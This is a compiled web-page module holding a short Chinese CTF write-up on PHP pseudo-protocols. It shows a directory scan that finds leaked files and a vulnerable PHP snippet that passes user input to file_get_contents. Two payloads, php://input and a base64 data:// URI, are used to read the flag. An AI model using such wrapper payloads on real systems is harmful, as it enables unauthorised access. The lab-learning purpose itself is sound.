import{_ as n,o as s,c as a,e}from"./app-b1c518ef.js";const t={},p=e(`<p>#PHP 伪协议</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>dirsearch <span class="token parameter variable">-u</span>  <span class="token string">&quot;url&quot;</span>

结果：
<span class="token punctuation">[</span><span class="token number">16</span>:16:45<span class="token punctuation">]</span> <span class="token number">200</span> -  233B  - /test.txt
<span class="token punctuation">[</span><span class="token number">16</span>:16:49<span class="token punctuation">]</span> <span class="token number">200</span> -  192B  - /www.rar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>/test.txt</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;cxk&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$cxk</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;cxk&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$cxk</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string double-quoted-string">&quot;ctrl&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;洗洗睡吧&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;nononoononoonono&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>/www.rar -&gt; gift(2).txt</p><div class="language-txt line-numbers-mode" data-ext="txt"><pre class="language-txt"><code>恭喜你
turn to

/orzorz.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现 test.txt 内容即为 orzorz.php</p><p>尝试 <code>?cxk=php://input</code> burpsuite 设置数据为 ctrl 成功 尝试 <code>?cxk=data://text/plain;base64,Y3RybA==</code> 成功</p>`,8),o=[p];function c(i,l){return s(),a("div",null,o)}const r=n(t,[["render",c],["__file","泄露的伪装.html.vue"]]);export{r as default};
